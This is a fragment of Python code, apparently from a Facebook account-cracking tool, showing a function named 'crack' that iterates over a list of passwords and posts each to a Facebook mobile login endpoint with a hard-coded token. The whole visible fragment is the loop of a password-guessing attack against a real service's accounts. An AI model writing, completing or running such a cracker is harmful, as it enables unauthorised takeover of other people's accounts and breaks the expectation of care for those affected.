...
def crack(idf,pwx,url,time_xx):
	...
	for pw in pwx:
		try:
			...
			post_method = ses.post(f"https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&ht_token=AbsTxxh6if1ljRfTrWB8dW_rUE1lZMLF3WrqjtJlPKtefNP3&h_consent=1&ht_l=login&lwv=10",data=date, headers=head)
